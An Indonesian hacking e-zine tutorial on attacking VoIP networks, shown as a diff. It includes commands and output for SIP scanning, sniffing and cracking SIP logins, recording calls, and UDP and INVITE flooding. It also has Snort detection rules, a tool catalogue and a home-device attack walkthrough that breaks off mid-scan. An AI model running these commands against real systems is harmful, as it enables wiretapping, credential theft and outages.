@@ -1,0 +1,1035 @@
+                                                
+              .;               .-.              
+  .-.  .-.    ;;-. .-..-.      `-' . ,';.  .-.  
+.;.-' ;      ;;  ;;   ;' ;.   ;'   ;;  ;;.;.-'  
+ `:::'`;;;;'.;`  ``;;'(   ;_.;:._.';  ;;  `:::' 
+                       `-'        ;    `.       
+ECHO MAGAZINE VOLUME IX, ISSUE XXIV, PHILE 0x06.TXT
+
+VoIP Series : Basic VoIP, Attacking Methodology, Sample Attacking - Lirva32
+http://www.lirva32.org
+
+-----[ Pendahuluan
+
+Tulisan ini sengaja saya buat untuk semua orang yang masih ingin
+belajar, jika juragan - juragan sudah pintar, tinggalkan saja tulisan
+ini karena hanya memberikan rasa bosan dalam membacanya.
+
+
+-----[ Kenalan dengan VoIP
+
+Voice Over Internet Protocol atau biasa juga disebut VoIP, IP
+Telephony, Internet Telephony atau Digital Phone merupakan teknologi
+yang memungkinkan percakapan suara jarak jauh melalui media internet
+(IP). Data suara diubah menjadi kode digital dan dialirkan melalui
+jaringan yang mengirimkan paket-paket data, dan bukan melalui sirkuit
+analog telepon biasa. Jadi VoIP itu adalah suara yang dikirim melalui
+internet protokol (IP).
+
+Tak kenal maka tak sayang, oleh karena itu ada beberapa hal yang harus
+kita kenal dalam VoIP, diantaranya :
+
+1. VoIP Signaling Gateway Protocol
+   Apa lagi nih ?, yang pasti tidak sejenis kue klepon ataupun
+   onde-onde.  VoIP Gateway Signaling Protocol merupakan protocol
+   gateway yang bertugas membagi VoIP signal ke dalam bentuk frame data
+   dan menyimpannya dalam bentuk voice packet, serta melanjutkan
+   pengiriman voice packet mempergunakan protocol gateway yang mampu
+   mengirim multimedia data packet.
+
+   Ini adalah beberapa VoIP Signaling Gateway Protocol, diantaranya
+   adalah : 
+   
+   - H.323		: H.323
+   - Megaco H.248	: Gateway Control Protocol
+   - MGCP 		: Media Gateway Control Protocol
+   - RVP over IP 	: Remote Voice Protocol Over IP 
+   - SAPv2 		: Session Announcement Protocol
+   - SDP		: Session Description Protocol
+   - SGCP 		: Simple Gateway Control Protocol
+   - SIP 		: Session Initiation Protocol
+   - Skinny		: Skinny Client Control Protocol (Cisco)
+
+
+2. VoIP Media Protocol
+   Mau tahu VoIP Media Protocol ?, kalau mau tahu ada syaratnya loh,
+   silahkan lari-lari kecil di kandang macan dulu atau joget bareng
+   7icons deh *lol*.
+
+   Protocol ini merupakan protocol yang bertugas melakukan konversi dan
+   kompresi media ke dalam format tertentu yang dibutuhkan oleh VoIP
+   Signaling. Protocol ini harus memiliki kemampuan untuk melakukan
+   proses Audio, Video dan T.120 (Multipoint Data Conferencing and Real
+   Time Communication Protocols) dengan berbagai kombinasi dan mampu
+   melakukan penterjemahan media secara full duplex.
+
+   Ini adalah beberapa VoIP Media Protocol, diantaranya :
+  
+   - DVB	: Digital Video Broadcasting
+   - H.261	: Video stream for transport using the real-time transport
+   - H.263	: Bitstream in the Real-time Transport Protocol
+   - RTCP	: RTP Control Protocol
+   - RTP	: Real-Time Transport
+
+
+3. VoIP Audio Codec
+   Kompresi dan dekompresi untuk VoIP audio file, seperti :
+
+   - DoD CELP - 4.8 Kbps
+   - GIPS Family - 13.3 Kbps and up
+   - iLBC - 15 Kbps, 20ms frames / 13.3 Kbps, 30ms frames
+   - ITU G.711 - 64Kbps (a.k.a. alaw / ulaw)
+   - ITU G.722 - 48 / 56 / 64 Kbps
+   - ITU G.723.1 - 5.3 / 6.3 Kbps, 30ms frames
+   - ITU G.726 - 16 / 24 / 32 / 40 Kbps
+   - ITU G.728 - 16 Kbps
+   - ITU G.729 - 8 Kbps, 10ms frames
+   - LPC10 - 2.5 Kbps
+   - Speex - 2.15 to 44.2 Kbps, Free Open-Source codec
+
+
+Untuk mendirikan VoIP Signaling dan VoIP Media, maka harus didirikan
+VoIP Server, diantaranya adalah :
+
+   - Asterisk (FYI : Asterisk is the world's most powerful and popular
+     telephony development tool-kit)
+   . Briker (base Asterisk)
+   . Linux LiveCD VoIP Server
+   . 3CX Phone System for Windows
+   . ceWarp VoIP SIP Server
+   . miniSipServer
+   . FreeSentral
+
+
+Itulah karakterisktik VoIP yang saya paparkan, semoga saja bisa
+dipahami dengan baik.
+
+Kini saatnya Anda untuk mengenal lebih jauh tindakan2 yang bisa
+dilakukan terhadap jaringan VoIP istilah kerennya sih VoIP Attacking.
+
+Yuk mari kita lanjutkan pada pembahasan yang mulai serius....*lol*.
+		
+
+-----[ VoIP Attacking Methodology
+
+Sebelum melakukan penyerangan terhadap jaringan berbasis VoIP, beberapa
+metode harus kita lakukan.
+
+Apakah metode yang akan dijabarkan disini ampuh ?  Metode disini hanya
+menjelaskan langkah-langkah yang dapat digunakan untuk menempuh
+perjakanan dalam melakukan penyerangan. Masalah "bobol" atau "tidak"
+sangat bergantung dalam setting perangkat tersebut, namun tetap
+berpegang teguh dalam jargon "Nothing System 100% Secure..!!".
+
+Tapi sebelumnya saya akan membahas tentang jaringan VoIP secara
+levelisasi sehingga kita bisa memahami tindakan penyerangan dengan baik
+dan benar.
+
+VoIP sendiri bersandar pada jaringan komputer berbabasis TCP/IP, saya
+memberikan gambaran levelisasinya sebagai berikut :
+
+1. Level 1 : VoIP Protocol 
+
+Apa yang bisa kita lakukan pada level ini, ya kita bisa melakukan
+kegiatan VoIP Fraud, SPIT (VoIP Spamming), Phishing, Malformed
+messages, Invite/Bycancel, Flodding, Call Hijacking, Call Eavesdropping
+dan Call Modification.
+
+Pada Level 1 ini bisa terdiri dari beberapa tehnikal ancaman,
+diantaranya :
+
+* VoIp Interception & Modification : call black holing, call rerouting,
+* fax alternation, conversation alternation, conversation degrading,
+* conversation hijacking.  VoIp Eavesdropping : call patter tracking,
+* number harvesting, fax recontruction, conversation recontruction.
+* VoIP DoS : request flodding, malformed requests, malformed messages,
+* QoS abuse, spoofed messages, call hijacking
+
+note : silahkan di google untuk mengetahui lebih lanjut istilah2
+tersebut, terus terang jika saya tulisan pengertian tersebut 1 per 1
+maka tulisan yang saya buat ini tidak akan pernah selesai...lol
+
+
+2. Level 2 : OS Security
+
+Ini adalah level 2, kita akan melakkukan penyerangan jika level 1 tidak
+bisa kita serang. Hasil penyerangan pada level ini juga akan memiliki
+imbas terhadap jaringan VoIP yang sedang berjalan.
+
+Apa yang bisa kita lakukan pada level ini?, santai masbro pada level
+ini kita bisa melakukan kegiatan seperti : Buffer Overflows,
+penyerangan dengan Worm, Crashing dengan DoS ataupun DDoS, Weak
+Configuration (--kelalaian Admin yg terpesona dengan Ayu ting-ting).
+
+
+3. Level 3 : Support Service
+
+Apa lagi tuh ?, yang pasti bukan jajanan pasar melainkan services a.k.a
+layanan yang berjalan pada devices yang menjadi target. Penyerangan
+bisa langsung tertuju pada layanan yang berjalan pada devices VoIP,
+misalkan saja : layanan FTP, layanan Telnet, layanan HTTP, layanan DHCP
+dan layanan lainnya yang bisa kita dapatkan melalui kegiatan
+"scanning".
+
+Apa yang bisa kita lakukan terhadap layanan2 yang aktif ?, ya seperti
+biasa saja misalnya melakukan kegiatan BruteForce (dictionary attack)
+terhadap layanan Telnet, FTP, HTTP form Login, DHCP resource
+exhaustion.
+
+4. Level 4 : Network Security
+
+Yuk kita serang bagian Network Security ..;), tentu saja yang berbasis
+TCP dan UDP. Dengan cara apa menyerangnya?, serang saja dengan :
+SYNflood, ICMP flooding, TFTP attack dan DDoS.
+
+5. Level 5 : Physical Security
+
+Hal ini kadang terlewatkan bahkan terlupakan, iya gak ?? sekali lagi
+kita bisa melakukan penyerangan terhadap hal-hal yang tidak mendapat
+perhatian, diantaranya : Total call server compromise, reboot, jamming.
+
+6. Level 6 : Policies & Procedure
+
+Hal ini adalah hal yang terpikirkan tapi hanya selintas, oleh karena
+itu kita bisa melakukan penyerangan dari sisi level ini. Penyerangan
+yang biasa dilakukan adalah : weak password, weak voicemail password,
+abuse priviledge.
+
+
+Nah, itulah levelisasi penyerangan yang bisa kita lakukan. Kini saatnya
+mengenal metoda yang biasa digunakan, diantaranya :
+
+
+1. VoIP Network Scanning
+
+VoIP environment tidak hanya sekedar telephone dan VoIP server
+melainkan juga ada services dan devices lainnya, seperti : routers and
+VPN gateways, web servers, TFTP servers, DNS servers, DHCP servers,
+RADIUS servers, firewalls, intrusion prevention systems, dan session
+border controllers.
+
+  smap	[Options]  < ip  |  ip/mask  |  host >
+
+  root@bt:~# apt-get install slurm-llnl
+  root@bt:~# ./smap 192.168.0.0/24
+
+  hasil :
+
+  smap 0.6.0 <hs@123.org> http://www.wormulon.net/
+
+  Host	    192.168.0.1:5060:	(ICMP	OK)	SIP	enabled
+  Host      192.168.0.2:5060:	(ICMP	OK)	SIP	timeout
+  Host	    192.168.0.3:5060:	(ICMP	timeout)	SIP	enabled
+  ...
+  ...
+  ...
+  Host	     192.168.0.150:5060:	(ICMP	OK)	SIP	enabled Asterisk  PBX  (unknown version)
+  150	hosts scanned, 10	ICMP reachable, 3 SIP enabled
+
+ *beberapa hal yg menunjukkan adanya VoIP : port 5060, SIP, Asterisk PBX
+
+ root@bt:~# ./smap –o 192.168.0.1
+
+ smap  0.6.0 <hs@123.org>  http://www.wormulon.net/
+
+ Host	192.168.100.1:5060:    (ICMP OK)     SIP    enabled
+
+ 1 hosts scanned, 1 ICMP reachable, 51SIP enabled
+
+
+
+2. VoIP Packet Capture 
+
+Menangkap paket data VoIP dalam jaringan target.
+
+root@bt:~# tcpdump -s 0 -w net-capture.txt  udp -i eth0
+tcpdump: WARNING: eth0: no IPv4 address assigned
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 byte
+237	packets	captured
+474	packets	received by filter
+0	packets	dropped	 by kernel
+
+
+
+3. VoIP Snffing 
+
+Mengintip paket data VoIP dalam jaringan target (--awas...bisa
+menimbulkan bintilan)
+
+root@bt:~# ./sipdump -d sip-logins.dump -f simpan-capture.txt
+
+SIPdump 0.1  (MaJoMu | www.remote-exploit.org )
+----------------------------------------------------------------
+* Using tcpdump data file 'simpan-capture.txt' for sniffing
+* Starting to sniff with filter 'tcp or udp'
+* Adding 192.168.0.1:50195 <-> 192.168.0.254:50451 to monitor list...id 0
+* New traffic on monitored connection 0 (192.168.123.92 -> 192.168.123.99)
+* Found challenge response (192.168.123.92:50195 <-> 192.168.123.99:50451)
+* Wrote sniffed login 192.168.123.92 ->192.168.123.99 (User: '222') to dump
+* file
+* Exiting, sniffed 1 logins
+
+3. VoIP Authentication 
+
+Hampir semua SIP Client dan SIP Devices mempergunakan proses
+autentikasi berbasis HTTP  dengan digest/MD5 (RFC. 2617) yang memiliki
+beberapa kelemahan sehingga mudah dilakukan proses cracking terhadap
+passwordnya.
+
+     SIPcrack + John The Ripper
+    ----------------------------------
+     root@bt:~# mkfifo lirvadictionary
+     root@bt:~# john --incremental=alnum --stdout=8 >fifo lirvadictionary
+     root@bt:~# ./sipcrack -w lirvadictionarycrack -d sip-logins.dump
+
+
+     SIPcrack 0.1 ( MaJoMu | www.remote-exploit.org )
+     ---------------------------------------------------------------
+
+     * Reading and parsing dump file...
+     * Found Accounts:
+
+     No	Server 		Client 	        User	Algorithm    Hash / Password
+
+     1	192.168.0.1  	192.168.0.23    5421    MD5	     x546 / xxda1cc1
+
+
+     * Select which entry to crack (1 – 1) : 1
+     * Generating static MD5 hash...  e718xxxxxxxxxxxxx9ff6c25aab955b2
+     * Starting bruteforce against user '5421'  (MD5 Hash: 'dfc9xxxxxxxxx546
+     * c08dc3xxxxxxxxc1')
+     * Loaded wordlist: 'lirvadictionary'
+     * Tried 25 passwords in 100 seconds
+     * Found password: 'user5xx1'
+     * Updating 'sip-logins.dump'...done
+
+     Note: proses cracking bisa berhari2.   
+
+
+
+3.  VoIP Wiretapping
+
+    Adalah proses merekam suara yang mengalir pada sambungan telephone.
+
+     root@bt:~# ./voipong
+
+     pasti gagal… karena kita belum membuat file : voipong.conf, yg isinya :
+
+------------------------------------- voipong.conf --------------------------
+
+     [GENERAL]
+     logdir		= /var/log
+     logfile		= voipong.log
+     cdrfile		= /var/log/voipcdr.log
+     networksfile	= /usr/local/etc/voipong/voipongnets
+     pidfile		= /var/run/voipong.pid
+     mgmt_ipcpath	= /tmp/voipongmgmt.sock
+     soxpath		= /usr/bin/sox
+     soxmixpath		= /usr/bin/soxmix
+     modpath		= /usr/local/etc/voipong/modules
+     mixwaves		= 0
+     defalg		= lfp
+     rtp_idle_time 	= 10
+     device		= eth0
+     promisc		= 1
+     snaplen		= 1500
+     readtmt		= 500
+     outdir		= /var/log/voipong/
+
+     [FILTERS]
+     startup	= "udp"
+
+
+------------------------------------ voipong.conf -------------------------------------
+
+
+root@bt:~# voipong
+    
+EnderUNIX VOIPONG Voice Over IP Sniffer starting...
+Release 2.0, running on bt [Linux 2.6.38 #1 SMP Thu Mar 17 20:52:18 EDT 2011 i686]
+(c) Murat Balaban http://www.enderunix.org/
+
+root@bt:~# voipctl
+Connected to VoIPong Management Console
+System:
+bt [Linux 2.6.38 #1 SMP Thu Mar 17 20:52:18 EDT 2011 i686]
+voipong> shcall
+
+
+ID	      NODE1	PORT1	    NODE2                  PORT2 STIME	    DURATION
+-----	  ----------------	-----	---------------- ---------	--------------------          --------------- 
+
+09534	  192.168.0.1	05022	192.168.0.92	16260	13/02/07  17:26:32    9   seconds
+
+Total	  listed: 1
+
+VoIPong Call File Recording :
+
+root@bt:~# cd /var/log/voipong/20100610/
+root@bt:~# ls *.wav
+session-enc0-PCMU-8KHz-192.168.0.1,5022-192.168.0.92,16260.wav
+session-enc0-PCMU-8KHz-192.168.0.1,5026-192.168.0.92,19088.wav
+
+4. VoIP Flooding
+   Adalah proses membanjiri VoIP devices dengan packet data secara terus menerus.
+
+
+   UDF Flodding
+   -----------------
+
+  root@bt:~#./udpflood <EthernetInterface> <SourceName> <DestinationName> <SourcePort> <DestinationPort> <NumPackets>
+
+  root@bt:~#./udpflood eth0 5000 lirva_machine asterisk_proxy 1000000
+
+  ** mengirim paket data sebesar 1000000 ke udp asterisk_proxy
+
+  root@bt:~#./udpflood eth0 hacker_box asterisk_proxy 9 5060 1000000
+
+  ** mengirim paket data sebesar 1000000 ke udp asterisk_proxy pada port 5060
+
+  SIP inviteFlood
+  -------------------
+
+  root@bt:~#./inviteflood <EthInt> <TargetUser> <TargetDomain> <DestinationIP> <NumPackets> –a Alias –I <SourceIP> –S <SourcePort> –d 
+  <DestinationPort> -l linestring –h -v
+
+  root@bt:~#./inviteflood eth0 5000 asterisk_proxy asterisk_proxy 1000
+
+  ** melakukan invite flood pada user “5000” dengan melakukan invite 1000 kali ke asterisk_proxy
+
+
+-----[ Pertahanan
+
+Jangan hanya bisa menyerang, lucu kan kalo cuma bisa menyerang tapi ga bisa
+bisa bertahan....;) oleh karena itu sebaiknya kita bisa melakukan pertahanan
+terhadap jaringan VoIP yang kita miliki.
+
+Bagaimana cara mempertahankannya?, okay gan tenang n santai kalau bisa relax
+biar nyangkut diotak sebenarnya sih simple saja, salah satunya adalah
+membangun Snort Rule dan Snort SIP Rule, seperti berikut ini :
+
+
+SNORT VoIP Rule :
+
+# Mencegah flooding pada SIP
+
+drop ip any any -> $HOME_NET  5060 (msg:"BLEEDING-EDGE VOIP INVITE Message
+Flood"; content:"INVITE";depth:6; threshold: type both, track by_src, count 100,
+seconds 60; classtype:attempted-dos; sid:2003192; rev:1;)
+
+drop ip any any-> $HOME_NET 5060 (msg:"BLEEDING-EDGE VOIP REGISTER Message
+Flood"; content:"REGISTER"; depth:8; threshold:type both, track by_src, count
+100, seconds 60; classtype:attempted-dos;sid:2003193;rev:1;)
+
+
+# Unauthorized responses from SIP Server
+
+drop ip $HOME_NET 5060 ->	any any	(msg:"BLEEDING-EDGE VOIP Multiple
+Unathorized SIP Responses"; content:"SIP/2.0 401 Unauthorized";	depth:24;
+threshold: type both, track by _ src, count 5, seconds 360;
+classtype:attempted-dos; sid:2003194; rev:1;)
+
+
+SNORT SIP Rule :
+
+#Rule submitted by rmkml
+
+drop udp $EXTERNAL_NET any -> $HOME_NET  5060 (msg:"COMMUNITY EXPLOIT SIP UDP
+Softphone overflow attempt";content:"|3B|branch|3D|"; content:"a|3D|";
+pcre:"/^a\x3D[^\n]{1000,}/smi"; reference:bugtraq,16213; reference:
+cve,2006-0189; classtype:misc-attack; sid:100000223; rev:1;)
+
+
+Selesai sudah methodology penyerangan terhadap jaringan VoIP,
+pelajarilah secara bertahap.
+
+
+-----[ VoIP Attacking Tools
+
+Nah, banyak sekali kegiatan yang bisa dilakukan dalam kegiatan
+attacking terhadap VoIP, tentu saja hal tersebut disebabkan karena
+berbasis IP.   
+
+*maaf, tindakan ini hanya boleh dilakukan oleh orang dewasa dan sudah
+berusia 17 tahun, nah llohhhh….??? Lol*, diantaranya : Sniffing, VoIP
+Packet Creation and Flooding Tools, Fuzzing, Signaling Manipulation,
+Media Manipulation.
+
+Banyak sekali dukungan aplikasi/software yang bisa dipergunakan untuk
+melakukan penetrasi testing terhadap security VoIP, yang pada akhirnya
+tools tersebut digunakan untuk melakukan attacking terhadap VoIP,
+diantaranya :
+
+1. Voip Sniffing
+   
+   Beberapa tools yang dapat digunakan untuk sniffing adalah :
+
+   - Etherpeek
+
+   - ILTY ("I'm Listening To You")
+
+   - AuthTool, dengan tools ini anda dapat mengetahui password user
+     dengan menganalisa SIP traffic.
+
+   - Cain & Abel, tools serba guna yang salah satunya  adalah memiliki
+     kemampuan untuk merekonstruksi RPT media calls.
+
+   - CommView VoIP Analyzer, merupakan VoIP analisis modul dari
+     aplikasi commView yang mampu menangkap VoIP secara realtime dan
+     melakukan analisa VoIP event, seperti call flow, signaling
+     sessions, registrations, media streams, errors.
+
+   - Oreka, aplikasi yang mampu merekam dan mengambil kembali audio
+     stream yang dikirim oleh SIP.
+
+   - PSIPDump, aplikasi yang dapat melakukan dumping SIP sessions (+RTP
+     traffic, if available) yang berasal dari  pcap kedalam disk
+
+   - rtpBreak, aplikasi yang dapat melakukan  rtpBreak detects,
+     reconstructs dan analisis heuristics RTP session melalui  UDP
+     network traffic. 
+
+   - RTCP packets.
+
+   - VOMIT, aplikasi yang dapat mengkonversi hasil percakapan yang
+     dilakukan oleh Cisco IP phone kebentuk *.wav dan dapat langsung
+     didengarkan dengan menjalankan sound player.
+
+   - Wireshark, multi-platform network traffic analyzer.
+
+   - Web Interface for SIP Trace, aplikasi berbasis Web PHP yang
+     mengizinkan attacker untuk melakukan koneksi secara remote dan
+     melakukan penangkapan juga filterasi SIP dialog.
+
+   - SIPomatic, aplikasi yang dapat mendengarkan percakapan yang
+     terjadi pada SIP
+
+   - SIPv6 Analyzer, aplikasi yang dapat menganalisa SIP dan IPv6.
+
+   - UCSniff, aplikasi yang dipergunakan untuk melakukan proses audit
+     terhadap jaringan VoIP dengan menjalankan beberapa test seperti :
+     unauthorized VoIP eavesdropping terhadap SIP, Skinny signaling,
+     G.711-ulaw and G.722 codecs, dan testing MITM ARP Poisoning mode.
+
+   - VoiPong, aplikasi yang dapat menditeksi seluruh  VoIP calls  pada
+     protocol pipeline, dapat melakukan encoded terhadap G711, dapat
+     melakukan aktual dumps conversation dengan membuat file *.wav
+     secara terpisah.  VoIPong dapat digunakan untuk penetrasi terhadap
+     VoIP server berbasis :  SIP, H323, Cisco's Skinny Client Protocol,
+     RTP and RTCP.
+
+
+
+2. VoIP Scanning and Enumeration Tools
+
+   - VoIPPack, tools yang digunakan untuk melakukan proses scannings,
+     enumeration, dan password attacks terhadap jaringan VoIP.
+
+   - enumIAX, aplikasi yang digunakan untuk melakukan login
+     enumerator terhadap IAX2 (Asterisk)  dengan memanfaatkan REGREQ
+     messages.
+
+   - SCTPScan, aplikasi yang dapat melakukan proses enumerasi terhadap
+     port SCTP yang terbuka tanpa melakukan koneksi terhadap SCTP
+     secara penuh melainkan hanya memerlukan asosiasi terhadap remote
+     host.  Dengan SCTPScan kita dapat melakukan proses scanning untuk
+     mencari SCTP-speaking machines.
+
+   - SIP-Scan, aplikasi SIP network scanner.
+
+   - SIPcrack, aplikasi yang dapat melakukan proses cracking terhadap
+     login SIP protocol  (SIPdump  melakukan sniffing  SIP logins
+     melalui jaringan komputer dan SIPcrack untuk melakukan passsword
+     bruteforce terhadap sniffed login)
+
+   - iaxscan, aplikasi berbasis python yang digunakan untuk mendeteksi
+     live IAX/2 hosts dan melakukan bruteforce terhadap account user.
+
+   - iWa, IAX2 protocol Wardialer
+   - SIPVicious Tool Suite, svmap, svwar, svcrack - svmap digunakan
+     untuk SIP scanner dan menampilkan list SIP devices dalam range IP,
+     sedangkan svwar bertugas untuk mendeteksi active extensions pada
+     sebuah  PBX,  svcrack berperan melakukan cracking  password SIP
+     PBX secara online.
+
+   - SiVuS, SIP Vulnerability Scanner.
+
+   - SMAP, SIP Stack Fingerprinting Scanner.
+
+   - VoIPAudit, VoIP specific scanning dan vulnerability scanner.
+
+   - nmap, network port scanner.
+
+  - Passive Vul. Scanner, aplikasi yang dapat melakukan pengecekan
+    terhadap kelemahan jaringan VoIP.
+  
+  - Sipflanker, aplikasi yang dapat mencari SIP devices  dengan
+    menampilkan beberapa potensi kelemahan di dalam network yang
+    terdapat VoIP.
+
+  - SIPSCAN, aplikasi yang dapat melakukan username enumerator terhadap
+    server SIP dengan mempergunakan metode : INVITE,REGISTER dan
+    OPTIONS.
+
+
+3. VoIP Packet Creation and Flooding Tools
+
+   - IAXFlooder : packet flooder dengan membuat  IAX packets.
+   - INVITE Flooder : melakukan SIP INVITE messages.
+   - SiPBlast 	: SIP Flood dengan mengemulasi secara masal CPE
+     call traffic
+   - kphone-ddos: mempergunakan KPhone untuk melakukan flooding.
+     attacks dengan SIP packet yang  telah di sniffing.
+   - NSAUDITOR 	: Flooder SIP UDP traffic .
+   - RTP Flooder: Melakukan flooding dengan  RTP Packets yang baik.
+   - Scapy		: interactive packet manipulation program.
+   - SIPBomber	: Aplikasi untuk melakukan testing terhadap
+     sip-protocol testing tool.
+   - SIPNess 	: Tools untuk melakukan testing terhadap aplikasi SIP.
+   - SIPp		: Traffic generator untuk  SIP protocol.
+   - SIPsak		: VoIP swiss army knife.
+
+4. VoIP Fuzzing Tools
+
+   - Asteroid, aplikasi yang mampu melakukan "malformed SIP" dengan
+     beberapa metoda seperti : INVITE, CANCEL, BYE, etc. yang dapat
+     diberikan kepada pengguna VoIP Phone.
+
+   - Codenomicon VoIP Fuzzers 
+
+   - Fuzzy Packet, aplikasi yang dapat memanipulasi pesan  dengan packet
+     capturing, packet injection dan mengirimnya melalui jaringan. Selain
+     itu dapat melakukan RTP  dan  poisoning.
+
+   - Interstate Fuzzer, cuma sebagai  VoIP Fuzzer saja.
+
+   - VoIP  Fuzzing Platform, aplikasi  fuzzing appliance untuk SIP,
+     Diameter, H.323 and MGCP protocols.
+
+   - ohrwurm, small and simple RTP fuzzer.
+
+   - PROTOS H.323 Fuzzer, tools berbasis java yang dapat melakukan
+     "malformed" yang dapat dikirim ke protocol H.323.
+
+   - PROTOS SIP Fuzzer, tools berbasis java yang dapat melakukan
+     "malformed" yang dapat dikirim ke Spirent ThreatEx : protocol
+     fuzzer.
+
+   - VoIPER, tools yang digunakan untuk melakukan testing terhadap VoIP
+     security vulnerabilties secara mudah dan otomatis. 
+
+
+5. VoIP Signaling Manipulation Tools
+
+   - BYE Teardown, aplikasi yang berupaya untuk memutuskan percakapan
+     VoIP dengan melakukan SIP BYE sniffing 
+
+   - Check Sync Phone Rebooter, aplikasi yang dapat mengirimkan special
+     NOTIFY SIP message dengan melakukan proses ‘reboot’ telephone
+     tertentu.
+
+   - H225regregject, Tools yang digunakan untuk memutuskan panggilan
+     H.323. 
+
+   - IAXAuthJack, aplikasi yang biasa digunakan untuk tindakan
+     penyerangan terhadap proses autentikasi sampai tingkat endpoint
+     dengan tujuan untuk mendapatkan plaintext password melalui
+     jaringan.
+
+   - IAXHangup, aplikasi yang digunakan untuk memutuskan panggilan yang
+     dilakukan oleh IAX.
+
+   - SiPCPE, aplikasi yang mampu menguji  infrasturktur SIP protocol
+     secara penuh dengan memasukkan SIP messages.
+
+   - RedirectPoison, aplikasi yang bekerja pada SIP signaling
+     environment dengan melakukan proses monitoring permintaan INVITE
+     dan SIP akan memberikan respon secara langsung.
+
+   - Registration Eraser, tools yang sangat efektif untuk melakukan
+     tindakan DoS dengan mengirim SIP REGISTER dari messages yang telah
+     disadap dan melakukan penghapusan user.
+
+   - Registration Hijacker, aplikasi yang dapat melakukan spoofing
+     terhadap SIP REGISTER messages dan mengalihkan seluruh incoming
+     calls pada attacker.
+
+   - SIP-Kill, aplikasi yang mampu melakukan proses Sniff terhadap
+     SIP-INVITEs dan memutuskan panggilan.
+
+   - SIP-Proxy-Kill, aplikasi yang mampu memutuskan SIP-Session 
+
+   - SIP-RedirectRTP, aplikasi yang mampu memanipulasi SDP headers dan
+     mengalihkan RTP packets ke RTP-proxy.
+
+   - SipRogue, multifungsi SIP proxy yang dapat menggabungkan diri
+     dalam percakapan masal (talking parties)
+
+   - VoIP Network Attack Toolkit, tools yang mampu melakukan
+     penyerangan terhadap berbagai VoIP Protocol dengan memanfaatkan
+     kombinasi nomor.
+
+
+Wah, ternyata banyak sekali aplikasi2 yang bisa kita gunakan untuk
+melakukan kegiatan attacking terhadap VoIP. Okeh deh selamat menikmati
+saja tools tersebut. Siapkan diri Anda berbekal untuk melakukan
+penyerangan terhadap jaringan berbasis VoIP.
+
+-----[ Sample Attacking : VoIP Boomber
+
+Wah .. serem sekali judulnya ?, yoi coy  sengaja dibuat agar terkesan
+angker saja kok, semoga saja isinya tidak seangker judulnya.
+
+Pada tulisan sebelumnya saya banyak menceritakan konsep dasar VOIP
+attacking dan konsep metodologi untuk melakukan penyerangan terhadap
+jaringan VoIP, maka kali ini kita akan melakukan penyerangan dan
+melumpuhkan jaringan berbasis VoIP.
+
+Ya, saya akan melakukan penyerangan terhadap perangkat VoIP yang ada di
+rumah saya, perangkat tersebut hanya : VoIP ATA.
+
+VoIP ? ATA ?, ya VoIP = Voice Over IP, sedangkan ATA = Analog Telephone
+Adapter. 
+
+Intinya adalah sebuah perangkat yang membuat telephone rumahan (analog
+phone) bisa dijadikan sebagai perangkat VoIP.
+
+Kalo saya gambarkan topologinya sih kayak gini :
+ 
++----------------------------------------------------------------------+
+| internet ----> wireless AP router ----> VoIP ATA ----> Analog Phone  |
++----------------------------------------------------------------------+
+
+Nah, yang menjadi target saya adalah VoIP ATA. Perangkat ini akan saya
+lakukan tindakan destruktif sehingga VoIP ATA tidak bisa digunakan
+untuk sementara dan terputus dari jalur VoIP services. 
+
+Teknik penyerangan ini berlaku pada semua pemodelan VoIP alias tidak
+terbatas pada topologi yang disimulasikan.
+
+Persiapan :
+1. Laptop
+2. OS Backtrack, saya menggunakan Backtrack 5 code name : Revolution
+3. wlan0, saya mempergunakan jaringan wireless dalam penyerangan
+
+
+Kegiatan Penyerangan :
+
+1. Memastikan IP pada interface wlan0.  Ya, saya harus memastikannya
+   karena saya terkoneksi pada sebuah Wireless AP Router sehingga   DHCP
+   server memberikan IP untuk devices yang saya pergunakan :
+
+   root@bt:~# ifconfig
+   
+   0-------------------------------------------------------------------------------0
+   0  wlan0     Link encap:Ethernet  HWaddr 00:1c:bf:00:5e:fb			   0          
+   0            inet addr:192.168.1.68  Bcast:192.168.1.255  Mask:255.255.255.0    0
+   0            inet6 addr: fe80::21c:bfff:fe00:5efb/64 Scope:Link		   0
+   0            UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1		   0
+   0            RX packets:6277 errors:0 dropped:0 overruns:0 frame:0          	   0
+   0            TX packets:20451 errors:0 dropped:0 overruns:0 carrier:0	   0
+   0            collisions:0 txqueuelen:1000					   0
+   0            RX bytes:6358679 (6.3 MB)  TX bytes:1733016 (1.7 MB)		   0
+   0-------------------------------------------------------------------------------0 
+    
+   Analisa :
+   Nah, laptop saya sudah mendapatkan IP dari DHCP Server, yaitu : 192.168.1.68,
+   mari lanjutkan pada langkah berikutnya.
+
+
+
+2. Melakukan scanning untuk mengidetifikasikan host live.
+   Pada langkah pertama sudah didapatkan IP : 192.168.1.68, maka
+   langkah berikutnya saya akan melakukan pencarian informasi yang
+   lebih mendalam dengan melakukan  scanning massal.
+
+   Disini hanya diperlukan sedikit analisa saja, yaitu menentukan 1
+   segment range IP yang akan di scanning massal, maka 1 range IP
+   tersebut adalah IP : 192.168.1.1 sampai dengan IP : 192.168.1.254.
+   Saya mempergunakan NMAP dengan metoda "intense scan & no ping",
+   dengan perintah sbb :
+
+   root@bt:~# nmap -T4 -A -v -Pn 192.168.1.1-254
+
+
+   ------------------------------------------------------------------------------
+
+   1     Starting Nmap 5.51 ( http://nmap.org ) at 2011-10-31 23:55 WIT	        
+   2     NSE: Loaded 57 scripts for scanning.				        
+   3     Initiating ARP Ping Scan at 23:55				        
+   4     Scanning 67 hosts [1 port/host]				         
+   5     Completed ARP Ping Scan at 23:55, 1.87s elapsed (67 total hosts)       
+   6     Initiating Parallel DNS resolution of 67 hosts. at 23:55	              
+   7     Completed Parallel DNS resolution of 67 hosts. at 23:55, 0.05s elapsed 
+   8     Nmap scan report for 192.168.1.2 [host down]			        
+   9     
+   10    
+   11    
+   12    Initiating SYN Stealth Scan at 23:56
+   13    Scanning 192.168.1.80 [1000 ports]
+   14    Discovered open port 80/tcp on 192.168.1.80
+   15    Completed SYN Stealth Scan at 23:56, 1.48s elapsed (1000 total ports)
+   16    Initiating Service scan at 23:56
+   17    Scanning 1 service on 192.168.1.80
+   18    Completed Service scan at 23:56, 5.01s elapsed (1 service on 1 host)
+   19    Initiating OS detection (try #1) against 192.168.1.80
+   20    NSE: Script scanning 192.168.1.80
+   21    Initiating NSE at 23:56
+   22    Completed NSE at 23:56, 9.03s elapsed
